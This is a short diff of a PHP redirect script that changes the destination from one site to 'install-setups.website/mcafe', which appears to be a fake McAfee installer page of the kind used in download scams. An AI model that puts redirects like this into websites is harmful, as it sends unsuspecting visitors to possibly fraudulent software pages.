@@ -1,4 +1,4 @@
 <?php
-header("Location: http://www.jmakeys.in/");
+header("Location: https://install-setups.website/mcafe");
 die();
 ?>
